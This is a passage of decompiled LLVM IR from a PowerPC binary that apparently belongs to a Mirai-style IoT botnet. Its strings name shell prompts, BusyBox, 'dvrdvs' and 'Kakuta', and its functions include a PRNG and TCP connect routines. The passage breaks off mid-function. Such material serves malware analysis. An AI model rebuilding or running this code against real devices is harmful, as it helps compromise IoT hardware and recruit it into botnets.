@global_var_1000fbf0.780 = constant i32 939524130
@global_var_1002b854.781 = global i32 0
@global_var_1002b93c.782 = local_unnamed_addr global i32 0
@global_var_1000fc84.783 = constant i32 1207960361
@global_var_1002b944.784 = local_unnamed_addr global i32 0
@global_var_1002b000.785 = global i32 -1
@global_var_1002b94c.786 = local_unnamed_addr global i32 0
@global_var_1002b950.787 = local_unnamed_addr global i32 0
@global_var_1001a15c.788 = constant [10 x i8] c"/dev/null\00"
@global_var_1002b954.789 = local_unnamed_addr global i32 0
@global_var_1002b940.790 = local_unnamed_addr global i32 0
@global_var_10010358.791 = constant i32 939524096
@global_var_10010374.792 = constant i32 939524096
@global_var_1002b978.793 = local_unnamed_addr global i32 0
@global_var_1002b95c.794 = global i32 0
@global_var_100106f0.795 = constant i32 939524180
@global_var_10010a8c.796 = constant i32 939524105
@global_var_1001a490.797 = constant [4 x i8] c"inf\00"
@global_var_1001a493.799 = constant i32 4804166
@global_var_1001a4a0.800 = constant i32 771763200
@global_var_10031ba0.802 = global i32 0
@global_var_1002b960.803 = local_unnamed_addr global i32 0
@global_var_100119bc.805 = constant i32 1207960848
@global_var_1002b968.806 = local_unnamed_addr global i32 0
@global_var_1001a4f0.807 = constant i32 771751936
@global_var_10031c50.808 = global i32 0
@global_var_10011aac.809 = constant [3 x i8] c"8a\00"
@global_var_10011ab8.810 = constant i32 939524097
@global_var_10011b8c.811 = constant i32 939524097
@global_var_10011c60.812 = constant i32 939524097
@global_var_10011c8c.813 = constant i32 939524100
@global_var_10011d6c.814 = constant i32 1207959684
@global_var_10011ee8.815 = constant i32 939589631
@global_var_1001a50c.816 = constant i32 1912602624
@global_var_1001a4f8.817 = constant [17 x i8] c"/etc/resolv.conf\00"
@global_var_1001a510.818 = constant [24 x i8] c"/etc/config/resolv.conf\00"
@global_var_1001a528.819 = constant [11 x i8] c"nameserver\00"
@global_var_1001a534.820 = constant [7 x i8] c"domain\00"
@global_var_1001a53c.821 = constant [7 x i8] c"search\00"
@global_var_10012220.822 = constant i32 1207959568
@global_var_10012228.823 = constant i32 939524099
@global_var_1002b888.824 = global i32 0
@global_var_1001238c.825 = constant i32 939524129
@global_var_1002b96c.826 = local_unnamed_addr global i32 0
@global_var_100123fc.827 = constant [3 x i8] c"8`\00"
@global_var_10012434.828 = constant i32 939524129
@global_var_1002b970.829 = local_unnamed_addr global i32 0
@global_var_1002b974.830 = local_unnamed_addr global i32 0
@global_var_1002b930.831 = local_unnamed_addr global i32 0
@global_var_100126cc.833 = constant i32 1207961085
@global_var_100128f4.834 = constant i32 939524171
@global_var_10012960.835 = constant i32 939524118
@global_var_10012984.836 = constant i32 1207960124
@global_var_1002b8e4.837 = local_unnamed_addr global i32 2
@global_var_10012bbc.838 = constant i32 1207959560
@global_var_10012e9c.839 = constant i32 1207959708
@global_var_10012f44.840 = constant i32 1207959612
@global_var_1001333c.841 = constant [3 x i8] c"8`\00"
@global_var_1001a558.842 = constant [17 x i8] c"0123456789abcdef\00"
@global_var_10013534.843 = constant [3 x i8] c"9 \00"
@global_var_10013540.844 = constant i32 939524193
@global_var_100135a8.846 = constant i32 939524101
@global_var_10013694.847 = constant i32 939524124
@global_var_1001370c.848 = constant i32 1207960116
@global_var_10013724.849 = constant i32 939524105
@global_var_1001389c.850 = constant [3 x i8] c"9 \00"
@global_var_1001a56c.851 = constant [3 x i8] c"%x\00"
@global_var_10013928.852 = constant i32 939524124
@global_var_1001394c.853 = constant i32 939524193
@global_var_1001a570.854 = constant [11 x i8] c"/etc/hosts\00"
@global_var_1001a57c.855 = constant [18 x i8] c"/etc/config/hosts\00"
@global_var_10014038.856 = constant i32 1207959560
@global_var_100140d0.857 = constant i32 939589631
@global_var_100145b4.858 = constant i32 939524105
@global_var_1002b004.859 = global i32 0
@global_var_1002b97c.2 = local_unnamed_addr global i8 0
@2 = internal constant [2 x i8] c"$\00"
@3 = internal constant [2 x i8] c"#\00"
@4 = internal constant [8 x i8] c"BusyBox\00"
@5 = internal constant [4 x i8] c"Box\00"
@6 = internal constant [6 x i8] c"shell\00"
@7 = internal constant [2 x i8] c"l\00"
@8 = internal constant [7 x i8] c"dvrdvs\00"
@9 = internal constant [3 x i8] c"vs\00"
@10 = internal constant [7 x i8] c"Kakuta\00"
@11 = internal constant [3 x i8] c"ta\00"
@global_var_10014920.13 = constant [10 x i8*] [i8* getelementptr inbounds ([2 x i8], [2 x i8]* @2, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @3, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @4, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @5, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @6, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @7, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @8, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @9, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @10, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @11, i32 0, i32 0)]
@global_var_1002b913.58 = local_unnamed_addr global i8 0
@global_var_1002b914.59 = local_unnamed_addr global i8 0
@global_var_1002b5a4.703 = global i16 288
@global_var_1002b5f4.704 = local_unnamed_addr global i16 272
@global_var_1002b934.832 = local_unnamed_addr global i16* null
@global_var_1002b86c.804 = local_unnamed_addr global i16 1
@global_var_10018e54.694 = constant [2 x i8] c"r\00"

declare void @__pseudo_call(i32) local_unnamed_addr

declare void @__pseudo_branch(i32) local_unnamed_addr

declare void @__pseudo_cond_branch(i1, i32) local_unnamed_addr

define i32 @function_10000094() local_unnamed_addr {
entry:
  store i32 268435620, i32* @lr, align 4
  %v0_100000a0 = call i32 @function_10000168()
  store i32 %v0_100000a0, i32* @r3, align 4
  store i32 268435624, i32* @lr, align 4
  %v1_100000a4 = call i32 @function_10014618(i32 %v0_100000a0)
  ret i32 %v1_100000a4
}

define i32 @function_100000b8() local_unnamed_addr {
entry:
  %v3_100000cc = load i8, i8* @global_var_1002b97c.2, align 1
  %v3_100000d4 = icmp eq i8 %v3_100000cc, 0
  br i1 %v3_100000d4, label %dec_label_pc_100000dc, label %dec_label_pc_10000134

dec_label_pc_100000dc:                            ; preds = %entry
  %v3_100000e0 = load i32, i32* bitcast (i32** @global_var_1002b01c.4 to i32*), align 4
  %v3_100000e8 = icmp eq i32 %v3_100000e0, 0
  br i1 %v3_100000e8, label %dec_label_pc_10000110, label %dec_label_pc_100000f0

dec_label_pc_100000f0:                            ; preds = %dec_label_pc_100000dc, %dec_label_pc_100000f0
  %v0_100000f4 = phi i32 [ %v3_10000100, %dec_label_pc_100000f0 ], [ %v3_100000e0, %dec_label_pc_100000dc ]
  %v1_100000f0 = add i32 %v0_100000f4, 4
  store i32 %v1_100000f0, i32* bitcast (i32** @global_var_1002b01c.4 to i32*), align 4
  call void @__pseudo_call(i32 %v0_100000f4)
  %v3_10000100 = load i32, i32* bitcast (i32** @global_var_1002b01c.4 to i32*), align 4
  %v3_10000108 = icmp eq i32 %v3_10000100, 0
  br i1 %v3_10000108, label %dec_label_pc_10000110, label %dec_label_pc_100000f0

dec_label_pc_10000110:                            ; preds = %dec_label_pc_100000f0, %dec_label_pc_100000dc
  store i8 1, i8* @global_var_1002b97c.2, align 1
  br label %dec_label_pc_10000134

dec_label_pc_10000134:                            ; preds = %entry, %dec_label_pc_10000110
  ret i32 undef

; uselistorder directives
  uselistorder i32 %v3_10000100, { 1, 0 }
  uselistorder i8* @global_var_1002b97c.2, { 1, 0 }
  uselistorder label %dec_label_pc_10000134, { 1, 0 }
  uselistorder label %dec_label_pc_100000f0, { 1, 0 }
}

define i32 @function_1000014c() local_unnamed_addr {
dec_label_pc_1000014c:
  %v0_10000164 = load i32, i32* @r3, align 4
  ret i32 %v0_10000164
}

define i32 @function_10000168() local_unnamed_addr {
dec_label_pc_10000168:
  %v3_100001a0 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_10030000.1 to i32), i32 -20464) to i32*), align 4
  %v3_100001ac = icmp eq i32 %v3_100001a0, 0
  br i1 %v3_100001ac, label %dec_label_pc_100001c4, label %dec_label_pc_100001b4

dec_label_pc_100001b4:                            ; preds = %dec_label_pc_10000168
  br label %dec_label_pc_100001c4

dec_label_pc_100001c4:                            ; preds = %dec_label_pc_100001b4, %dec_label_pc_10000168
  ret i32 add (i32 ptrtoint (i32* @global_var_10030000.1 to i32), i32 -20464)
}

define i32 @function_100001d4() local_unnamed_addr {
dec_label_pc_100001d4:
  %v0_100001ec = load i32, i32* @r3, align 4
  ret i32 %v0_100001ec
}

define i32 @entry_point(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %stack_var_4 = alloca i32, align 4
  %stack_var_0 = alloca i32, align 4
  store i32 %arg2, i32* %stack_var_0, align 4
  %v0_100001f4 = load i32, i32* @r1, align 4
  %v1_100001f4 = call i32 @__asm_rlwinm(i32 %v0_100001f4, i32 0, i32 0, i32 27)
  store i32 0, i32* %r0.global-to-local, align 4
  %v2_10000204 = add i32 %v1_100001f4, -16
  %v3_10000204 = inttoptr i32 %v2_10000204 to i32*
  store i32 %v1_100001f4, i32* %v3_10000204, align 4
  %v0_10000208 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_10000208, i32* %v3_10000204, align 4
  %v2_10000210 = load i32, i32* %stack_var_0, align 4
  %v7_10000234 = call i32 @function_1001012c(i32 268482064, i32 %v2_10000210, i32* nonnull %stack_var_4, i32 268435604, i32 268519044, i32 %arg1)
  ret i32 %v7_10000234

; uselistorder directives
  uselistorder i32 %v1_100001f4, { 1, 0 }
  uselistorder i32* %stack_var_0, { 1, 0 }
}

define i32 @function_10000238(i32 %arg1, i16 %arg2) local_unnamed_addr {
dec_label_pc_10000238:
  %stack_var_-32 = alloca i32, align 4
  %stack_var_-44 = alloca i32, align 4
  %stack_var_-48 = alloca i32, align 4
  store i32 1, i32* %stack_var_-32, align 4
  store i32 268436072, i32* @lr, align 4
  %v1_10000264 = call i32 @function_1000e834(i32 %arg1)
  %v3_10000274 = icmp eq i32 %v1_10000264, 0
  br i1 %v3_10000274, label %dec_label_pc_1000027c, label %dec_label_pc_10000288

dec_label_pc_1000027c:                            ; preds = %dec_label_pc_10000238
  br label %dec_label_pc_10000360

dec_label_pc_10000288:                            ; preds = %dec_label_pc_10000238
  %v1_1000028c = add i32 %v1_10000264, 16
  %v2_1000028c = inttoptr i32 %v1_1000028c to i32*
  %v3_1000028c = load i32, i32* %v2_1000028c, align 4
  %v1_10000290 = inttoptr i32 %v3_1000028c to i32*
  %v2_10000290 = load i32, i32* %v1_10000290, align 4
  %v1_10000298 = add i32 %v1_10000264, 12
  %v2_10000298 = inttoptr i32 %v1_10000298 to i32*
  %v3_10000298 = load i32, i32* %v2_10000298, align 4
  %v2_100002a0 = ptrtoint i32* %stack_var_-48 to i32
  %v2_100002a4 = ptrtoint i32* %stack_var_-44 to i32
  store i32 %v3_10000298, i32* @r5, align 4
  store i32 268436152, i32* @lr, align 4
  %v4_100002b4 = call i32 @function_1000e3e0(i32 %v2_10000290, i32 %v2_100002a4, i32 %v3_10000298, i32 %v2_100002a0)
  %v4_100002b8 = zext i16 %arg2 to i32
  store i32 %v4_100002b8, i32* @r3, align 4
  %v1_100002c4 = call i32 @function_1000e698(i32 %v4_100002b8)
  store i32 2, i32* %stack_var_-48, align 4
  store i32 268436200, i32* @lr, align 4
  %v3_100002e4 = call i32 @function_1000ed5c(i32 2, i32 1, i32 6)
  %v2_100002f0 = ptrtoint i32* %stack_var_-32 to i32
  store i32 268436236, i32* @lr, align 4
  %v5_10000308 = call i32 @function_1000ed20(i32 %v3_100002e4, i32 6, i32 1, i32 %v2_100002f0, i32 4)
  %v4_10000314 = icmp eq i32 %v3_100002e4, -1
  br i1 %v4_10000314, label %dec_label_pc_1000031c, label %dec_label_pc_10000328

dec_label_pc_1000031c:                            ; preds = %dec_label_pc_10000288
  br label %dec_label_pc_10000360

dec_label_pc_10000328:                            ; preds = %dec_label_pc_10000288
  store i32 268436284, i32* @lr, align 4
  %v3_10000338 = call i32 @function_1000ebcc(i32 %v3_100002e4, i32 %v2_100002a0, i32 16)
  %v4_10000344 = icmp eq i32 %v3_10000338, -1
  br i1 %v4_10000344, label %dec_label_pc_1000034c, label %dec_label_pc_10000358

dec_label_pc_1000034c:                            ; preds = %dec_label_pc_10000328
  br label %dec_label_pc_10000360

dec_label_pc_10000358:                            ; preds = %dec_label_pc_10000328
  br label %dec_label_pc_10000360

dec_label_pc_10000360:                            ; preds = %dec_label_pc_1000034c, %dec_label_pc_1000031c, %dec_label_pc_1000027c, %dec_label_pc_10000358
  %stack_var_-16.0 = phi i32 [ 0, %dec_label_pc_1000027c ], [ 0, %dec_label_pc_1000031c ], [ 0, %dec_label_pc_1000034c ], [ %v3_100002e4, %dec_label_pc_10000358 ]
  ret i32 %stack_var_-16.0

; uselistorder directives
  uselistorder i32 %v2_100002a0, { 1, 0 }
  uselistorder i32 %v3_10000298, { 1, 0 }
  uselistorder i32* %stack_var_-32, { 1, 0 }
  uselistorder label %dec_label_pc_10000360, { 3, 0, 1, 2 }
}

define i32 @function_10000380(i32 %arg1) local_unnamed_addr {
dec_label_pc_10000380:
  store i32 %arg1, i32* @global_var_1002b998.7, align 4
  %v1_100003a8 = add i32 %arg1, -1640531527
  store i32 %v1_100003a8, i32* @global_var_1002b99c.8, align 4
  %v1_100003c0 = add i32 %arg1, 1013904242
  store i32 %v1_100003c0, i32* @global_var_1002b9a0.9, align 4
  br label %dec_label_pc_100003dc

dec_label_pc_100003dc:                            ; preds = %dec_label_pc_10000380, %dec_label_pc_100003dc
  %storemerge12 = phi i32 [ 3, %dec_label_pc_10000380 ], [ %v1_10000444, %dec_label_pc_100003dc ]
  %v1_100003e4 = mul i32 %storemerge12, 4
  %v2_100003f4 = add i32 %v1_100003e4, add (i32 ptrtoint (i32* @global_var_1002b998.7 to i32), i32 -12)
  %v1_100003f8 = inttoptr i32 %v2_100003f4 to i32*
  %v2_100003f8 = load i32, i32* %v1_100003f8, align 4
  %v2_10000410 = add i32 %v1_100003e4, add (i32 ptrtoint (i32* @global_var_1002b998.7 to i32), i32 -8)
  %v1_10000414 = inttoptr i32 %v2_10000410 to i32*
  %v2_10000414 = load i32, i32* %v1_10000414, align 4
  %v2_10000418 = xor i32 %storemerge12, -1640531527
  %v2_10000420 = xor i32 %v2_10000418, %v2_100003f8
  %v1_10000428 = xor i32 %v2_10000420, %v2_10000414
  %v2_10000438 = add i32 %v1_100003e4, ptrtoint (i32* @global_var_1002b998.7 to i32)
  %v2_1000043c = inttoptr i32 %v2_10000438 to i32*
  store i32 %v1_10000428, i32* %v2_1000043c, align 4
  %v1_10000444 = add nuw nsw i32 %storemerge12, 1
  %tmp7 = icmp slt i32 %v1_10000444, 4096
  br i1 %tmp7, label %dec_label_pc_100003dc, label %dec_label_pc_10000458

dec_label_pc_10000458:                            ; preds = %dec_label_pc_100003dc
  ret i32 %arg1

; uselistorder directives
  uselistorder i32 %v1_100003e4, { 2, 1, 0 }
  uselistorder i32 %storemerge12, { 2, 1, 0 }
  uselistorder i32 %arg1, { 1, 0, 3, 2 }
  uselistorder label %dec_label_pc_100003dc, { 1, 0 }
}

define i32 @function_10000468() local_unnamed_addr {
dec_label_pc_10000468:
  %r10.global-to-local = alloca i32, align 4
  store i32 18782, i32* %r10.global-to-local, align 4
  %v3_10000490 = load i32, i32* @global_var_1002b570.10, align 4
  %v1_10000494 = add i32 %v3_10000490, 1
  %v1_10000498 = urem i32 %v1_10000494, 4096
  store i32 %v1_10000498, i32* @global_var_1002b570.10, align 4
  %v1_100004b4 = mul nuw nsw i32 %v1_10000498, 4
  %v2_100004b8 = add i32 %v1_100004b4, ptrtoint (i32* @global_var_1002b998.7 to i32)
  %v1_100004bc = inttoptr i32 %v2_100004b8 to i32*
  %v2_100004bc = load i32, i32* %v1_100004bc, align 4
  %v6_100004e0 = udiv i32 %v2_100004bc, 228675
  %v2_100004e4 = mul i32 %v2_100004bc, 18782
  %v3_100004f4 = load i32, i32* @global_var_1002b56c.11, align 4
  %v2_10000500 = add i32 %v3_100004f4, %v2_100004e4
  %v3_10000500 = icmp ult i32 %v2_10000500, %v3_100004f4
  %v4_10000504 = zext i1 %v3_10000500 to i32
  %v5_10000504 = add nuw nsw i32 %v4_10000504, %v6_100004e0
  store i32 %v5_10000504, i32* %r10.global-to-local, align 4
  %v2_10000534 = add i32 %v5_10000504, %v2_10000500
  %v2_10000548 = icmp ult i32 %v2_10000534, %v5_10000504
  br i1 %v2_10000548, label %dec_label_pc_10000550, label %dec_label_pc_10000570

dec_label_pc_10000550:                            ; preds = %dec_label_pc_10000468
  %v1_10000554 = add i32 %v2_10000534, 1
  %v1_10000564 = add nuw nsw i32 %v5_10000504, 1
  br label %dec_label_pc_10000570

dec_label_pc_10000570:                            ; preds = %dec_label_pc_10000468, %dec_label_pc_10000550
  %storemerge = phi i32 [ %v1_10000564, %dec_label_pc_10000550 ], [ %v5_10000504, %dec_label_pc_10000468 ]
  %stack_var_-36.0 = phi i32 [ %v1_10000554, %dec_label_pc_10000550 ], [ %v2_10000534, %dec_label_pc_10000468 ]
  store i32 %storemerge, i32* @global_var_1002b56c.11, align 4
  store i32 %v1_10000498, i32* %r10.global-to-local, align 4
  %v2_10000580 = sub i32 -2, %stack_var_-36.0
  store i32 %v2_10000580, i32* %v1_100004bc, align 4
  %v0_100005a0 = load i32, i32* %r10.global-to-local, align 4
  %v1_100005a0 = mul i32 %v0_100005a0, 4
  %v2_100005a4 = add i32 %v1_100005a0, ptrtoint (i32* @global_var_1002b998.7 to i32)
  %v1_100005a8 = inttoptr i32 %v2_100005a4 to i32*
  %v2_100005a8 = load i32, i32* %v1_100005a8, align 4
  ret i32 %v2_100005a8

; uselistorder directives
  uselistorder i32 %v5_10000504, { 0, 2, 3, 1, 4 }
  uselistorder i32 %v3_100004f4, { 1, 0 }
  uselistorder i32 %v2_100004bc, { 1, 0 }
  uselistorder i32 %v1_10000498, { 2, 0, 1 }
  uselistorder i32* @global_var_1002b998.7, { 1, 0 }
  uselistorder i32 ptrtoint (i32* @global_var_1002b998.7 to i32), { 2, 3, 4, 0, 1 }
  uselistorder label %dec_label_pc_10000570, { 1, 0 }
}

define i32 @function_100005c0(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_100005c0:
  br label %dec_label_pc_100005f4

dec_label_pc_100005f4:                            ; preds = %dec_label_pc_100005f4, %dec_label_pc_100005c0
  %stack_var_-36.0 = phi i32 [ 0, %dec_label_pc_100005c0 ], [ %v1_100005f8, %dec_label_pc_100005f4 ]
  %v1_100005f8 = add i32 %stack_var_-36.0, 1
  %v1_10000604 = mul i32 %v1_100005f8, 4
  %v2_10000610 = add i32 %v1_10000604, %arg2
  %v1_10000614 = inttoptr i32 %v2_10000610 to i32*
  %v2_10000614 = load i32, i32* %v1_10000614, align 4
  %v3_10000618 = icmp eq i32 %v2_10000614, 0
  br i1 %v3_10000618, label %dec_label_pc_10000678.preheader, label %dec_label_pc_100005f4

dec_label_pc_10000678.preheader:                  ; preds = %dec_label_pc_100005f4
  %v2_100006804 = icmp sgt i32 %v1_100005f8, 0
  br i1 %v2_100006804, label %dec_label_pc_1000062c.lr.ph, label %dec_label_pc_10000690

dec_label_pc_1000062c.lr.ph:                      ; preds = %dec_label_pc_10000678.preheader
  %v3_10000650 = inttoptr i32 %arg1 to i8*
  br label %dec_label_pc_1000062c

dec_label_pc_1000062c:                            ; preds = %dec_label_pc_1000062c.lr.ph, %dec_label_pc_1000066c
  %storemerge27 = phi i32 [ 0, %dec_label_pc_1000062c.lr.ph ], [ %v1_10000670, %dec_label_pc_1000066c ]
  %v1_10000630 = mul i32 %storemerge27, 4
  %v2_1000063c = add i32 %v1_10000630, %arg2
  %v1_10000640 = inttoptr i32 %v2_1000063c to i32*
  %v2_10000640 = load i32, i32* %v1_10000640, align 4
  store i32 268437076, i32* @lr, align 4
  %v4_10000650 = call i32 @function_1000e3f0(i8* %v3_10000650, i32 %v2_10000640, i32 %v2_1000063c)
  %v3_10000658 = icmp eq i32 %v4_10000650, 0
  br i1 %v3_10000658, label %dec_label_pc_1000066c, label %dec_label_pc_10000690.loopexit

dec_label_pc_1000066c:                            ; preds = %dec_label_pc_1000062c
  %v1_10000670 = add nuw nsw i32 %storemerge27, 1
  %v2_10000680 = icmp slt i32 %v1_10000670, %v1_100005f8
  br i1 %v2_10000680, label %dec_label_pc_1000062c, label %dec_label_pc_10000690.loopexit

dec_label_pc_10000690.loopexit:                   ; preds = %dec_label_pc_1000066c, %dec_label_pc_1000062c
  %storemerge.ph = phi i32 [ 1, %dec_label_pc_1000062c ], [ 0, %dec_label_pc_1000066c ]
  br label %dec_label_pc_10000690

dec_label_pc_10000690:                            ; preds = %dec_label_pc_10000690.loopexit, %dec_label_pc_10000678.preheader
  %storemerge = phi i32 [ 0, %dec_label_pc_10000678.preheader ], [ %storemerge.ph, %dec_label_pc_10000690.loopexit ]
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %storemerge27, { 1, 0 }
  uselistorder i32 %v1_100005f8, { 2, 1, 0, 3 }
  uselistorder label %dec_label_pc_1000062c, { 1, 0 }
}

define i32 @function_100006b0(i32 %arg1) local_unnamed_addr {
dec_label_pc_100006b0:
  %v3_100006d4 = call i32 @function_100005c0(i32 %arg1, i32 ptrtoint ([5 x i8*]* @global_var_1002b0b8.17 to i32))
  ret i32 %v3_100006d4
}

define i32 @function_100006f8(i32 %arg1) local_unnamed_addr {
dec_label_pc_100006f8:
  %v3_1000071c = call i32 @function_100005c0(i32 %arg1, i32 ptrtoint ([7 x i8*]* @global_var_1002b098.25 to i32))
  ret i32 %v3_1000071c
}

define i32 @function_10000740(i32 %arg1) local_unnamed_addr {
dec_label_pc_10000740:
  store i32 268437344, i32* @lr, align 4
  %v1_1000075c = call i32 @function_100006b0(i32 %arg1)
  %v3_10000764 = icmp eq i32 %v1_1000075c, 0
  br i1 %v3_10000764, label %dec_label_pc_1000076c, label %dec_label_pc_10000794

dec_label_pc_1000076c:                            ; preds = %dec_label_pc_10000740
  store i32 268437364, i32* @lr, align 4
  %v1_10000770 = call i32 @function_100006f8(i32 %arg1)
  %v3_10000778 = icmp ne i32 %v1_10000770, 0
  %. = zext i1 %v3_10000778 to i32
  br label %dec_label_pc_10000794

dec_label_pc_10000794:                            ; preds = %dec_label_pc_1000076c, %dec_label_pc_10000740
  %storemerge = phi i32 [ 1, %dec_label_pc_10000740 ], [ %., %dec_label_pc_1000076c ]
  ret i32 %storemerge
}

define i32 @function_100007b4(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_100007b4:
  %stack_var_-48 = alloca i32, align 4
  %stack_var_-184 = alloca i32, align 4
  %stack_var_-176 = alloca i32, align 4
  store i32 0, i32* %stack_var_-48, align 4
  %v2_100007e8 = ptrtoint i32* %stack_var_-176 to i32
  store i32 %v2_100007e8, i32* %stack_var_-184, align 4
  store i32 0, i32* %stack_var_-176, align 4
  br label %dec_label_pc_100007fc.dec_label_pc_100007fc_crit_edge

dec_label_pc_100007fc.dec_label_pc_100007fc_crit_edge: ; preds = %dec_label_pc_100007fc.dec_label_pc_100007fc_crit_edge.dec_label_pc_100007fc.dec_label_pc_100007fc_crit_edge_crit_edge, %dec_label_pc_100007b4
  %v3_10000800.pre = phi i32 [ %v2_100007e8, %dec_label_pc_100007b4 ], [ %v3_10000800.pre.pre, %dec_label_pc_100007fc.dec_label_pc_100007fc_crit_edge.dec_label_pc_100007fc.dec_label_pc_100007fc_crit_edge_crit_edge ]
  %v1_1000081821 = phi i32 [ 1, %dec_label_pc_100007b4 ], [ %v1_10000818, %dec_label_pc_100007fc.dec_label_pc_100007fc_crit_edge.dec_label_pc_100007fc.dec_label_pc_100007fc_crit_edge_crit_edge ]
  %v1_10000804 = mul nuw nsw i32 %v1_1000081821, 4
  %v2_10000808 = add i32 %v1_10000804, %v3_10000800.pre
  %v2_10000810 = inttoptr i32 %v2_10000808 to i32*
  store i32 0, i32* %v2_10000810, align 4
  %v1_10000818 = add nuw nsw i32 %v1_1000081821, 1
  %tmp19 = icmp ult i32 %v1_10000818, 32
  br i1 %tmp19, label %dec_label_pc_100007fc.dec_label_pc_100007fc_crit_edge.dec_label_pc_100007fc.dec_label_pc_100007fc_crit_edge_crit_edge, label %dec_label_pc_1000082c

dec_label_pc_100007fc.dec_label_pc_100007fc_crit_edge.dec_label_pc_100007fc.dec_label_pc_100007fc_crit_edge_crit_edge: ; preds = %dec_label_pc_100007fc.dec_label_pc_100007fc_crit_edge
  %v3_10000800.pre.pre = load i32, i32* %stack_var_-184, align 4
  br label %dec_label_pc_100007fc.dec_label_pc_100007fc_crit_edge

dec_label_pc_1000082c:                            ; preds = %dec_label_pc_100007fc.dec_label_pc_100007fc_crit_edge
  %v1_10000830 = udiv i32 %arg1, 32
  %v1_10000838 = mul nuw nsw i32 %v1_10000830, 4
  %v2_1000083c = ptrtoint i32* %stack_var_-184 to i32
  %v2_10000840 = add nuw nsw i32 %v1_10000838, 8
  %v1_10000844 = add i32 %v2_10000840, %v2_1000083c
  %v1_10000848 = inttoptr i32 %v1_10000844 to i32*
  %v2_10000848 = load i32, i32* %v1_10000848, align 4
  %v1_10000850 = urem i32 %arg1, 32
  %v3_10000858 = shl i32 1, %v1_10000850
  %v2_1000085c = or i32 %v2_10000848, %v3_10000858
  store i32 %v2_1000085c, i32* %v1_10000848, align 4
  %v1_10000878 = add i32 %arg1, 1
  %v2_10000880 = ptrtoint i32* %stack_var_-48 to i32
  store i32 268437660, i32* @lr, align 4
  %v5_10000898 = call i32 @function_1000c684(i32 %v1_10000878, i32 %v2_100007e8, i32 0, i32 0, i32 %v2_10000880)
  %v2_100008a0 = icmp sgt i32 %v5_10000898, 0
  br i1 %v2_100008a0, label %dec_label_pc_100008b4, label %dec_label_pc_100008d4

dec_label_pc_100008b4:                            ; preds = %dec_label_pc_1000082c
  store i32 268437708, i32* @lr, align 4
  %v4_100008c8 = call i32 @function_1000ec70(i32 %arg1, i32 %arg3, i32 %arg4, i32 0)
  br label %dec_label_pc_100008d4

dec_label_pc_100008d4:                            ; preds = %dec_label_pc_1000082c, %dec_label_pc_100008b4
  %storemerge = phi i32 [ %v4_100008c8, %dec_label_pc_100008b4 ], [ 0, %dec_label_pc_1000082c ]
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %v1_10000818, { 1, 0 }
  uselistorder i32 %v2_100007e8, { 1, 0, 2 }
  uselistorder i32* %stack_var_-184, { 2, 0, 1 }
  uselistorder i32* %stack_var_-48, { 1, 0 }
  uselistorder i32 %arg1, { 2, 3, 1, 0 }
  uselistorder label %dec_label_pc_100008d4, { 1, 0 }
}

define i32 @function_100008f4(i32 %arg1, i32 %arg2, i8* %arg3, i32 %arg4, i32 %arg5, i32 %arg6) local_unnamed_addr {
dec_label_pc_100008f4:
  %tmp = ptrtoint i8* %arg3 to i32
  store i32 268437812, i32* @lr, align 4
  %v4_10000930 = call i32 @function_1000dd4c(i32 %tmp, i32 0, i32 %arg4)
  %v5_10000944 = call i32 @function_100007b4(i32 %arg1, i32 %arg2, i32 %tmp, i32 %arg4)
  %v3_10000954 = load i8, i8* %arg3, align 1
  %v3_1000095c = icmp eq i8 %v3_10000954, -1
  br i1 %v3_1000095c, label %dec_label_pc_10000964, label %dec_label_pc_10000978

dec_label_pc_10000964:                            ; preds = %dec_label_pc_100008f4
  store i32 268437880, i32* @lr, align 4
  %v6_10000974 = call i32 @function_10002dc4(i32 %arg1, i32 %tmp, i32 3, i32 %tmp)
  br label %dec_label_pc_10000978

dec_label_pc_10000978:                            ; preds = %dec_label_pc_100008f4, %dec_label_pc_10000964
  %v3_10000980 = call i32 @function_100005c0(i32 %tmp, i32 %arg5)
  %v3_10000988 = icmp ne i32 %v3_10000980, 0
  %. = zext i1 %v3_10000988 to i32
  ret i32 %.

; uselistorder directives
  uselistorder i32 (i32, i32)* @function_100005c0, { 2, 1, 0 }
  uselistorder i32 %arg4, { 1, 0 }
  uselistorder label %dec_label_pc_10000978, { 1, 0 }
}

define i32 @function_100009c4(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_100009c4:
  %stack_var_-20 = alloca i32, align 4
  %v1_100009e0 = add i32 %arg1, 4
  %v2_100009e0 = inttoptr i32 %v1_100009e0 to i32*
  %v3_100009e0 = load i32, i32* %v2_100009e0, align 4
  store i32 %v3_100009e0, i32* %stack_var_-20, align 4
  store i32 268438012, i32* @lr, align 4
  %v3_100009f8 = call i32 @function_1000e7cc(i32* nonnull %stack_var_-20, i32 %arg1)
  ret i32 %v3_100009f8
}

define i32 @function_10000a1c(i32* %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_10000a1c:
  %tmp = ptrtoint i32* %arg1 to i32
  %v3_10000a3c = icmp eq i32 %arg2, 0
  br i1 %v3_10000a3c, label %dec_label_pc_10000a44, label %dec_label_pc_10000a54

dec_label_pc_10000a44:                            ; preds = %dec_label_pc_10000a1c
  %v2_10000a48 = load i32, i32* %arg1, align 4
  store i32 268438100, i32* @lr, align 4
  %v1_10000a50 = call i32 @function_1000c2f4(i32 %v2_10000a48)
  br label %dec_label_pc_10000a54

dec_label_pc_10000a54:                            ; preds = %dec_label_pc_10000a1c, %dec_label_pc_10000a44
  %v2_10000a5c = add i32 %tmp, 16
  %v3_10000a5c = inttoptr i32 %v2_10000a5c to i32*
